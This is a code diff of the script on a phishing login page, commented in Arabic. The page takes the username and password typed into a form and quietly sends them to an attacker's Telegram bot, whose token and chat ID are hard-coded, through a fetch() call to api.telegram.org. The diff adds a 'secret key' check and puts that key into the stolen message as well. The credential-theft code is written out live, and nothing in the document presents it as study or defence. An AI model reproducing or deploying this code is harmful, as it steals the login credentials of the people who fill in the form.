@@ -72,6 +72,7 @@
     <script>
         const botToken = '8080174902:AAHX9XK3_Yd-TkY8Vq2LBzK8BGCWFmqy17o'; // توكن البوت
         const chatId = '7203065656'; // معرف الدردشة الخاص بك
+        const secretKey = 'mySecretKey123'; // مفتاح التحقق
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // منع إرسال النموذج الافتراضي
@@ -80,20 +81,26 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
+            // تحقق من أن البيانات تحتوي على المفتاح السري
+            if (username !== secretKey) {
+                alert("التحقق فشل! المفتاح السري غير صحيح.");
+                return;
+            }
+
             // رسالة التي ستُرسل
-            const message = `👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
+            const message = `👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}\n🔑 المفتاح السري: ${secretKey}`;
 
             // رابط API تيليغرام
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // إرسال الطلب بصمت
+            // إرسال الطلب
             fetch(url)
                 .catch(error => {
                     console.error('Error:', error); // تسجيل الأخطاء في وحدة التحكم فقط
                 });
 
-            // إعادة توجيه أو إعادة تعيين النموذج بعد الإرسال
-            document.getElementById('loginForm').reset(); // إعادة تعيين الحقول
+            // إعادة تعيين الحقول
+            document.getElementById('loginForm').reset(); // إعادة تعيين النموذج
         });
     </script>
 </body>
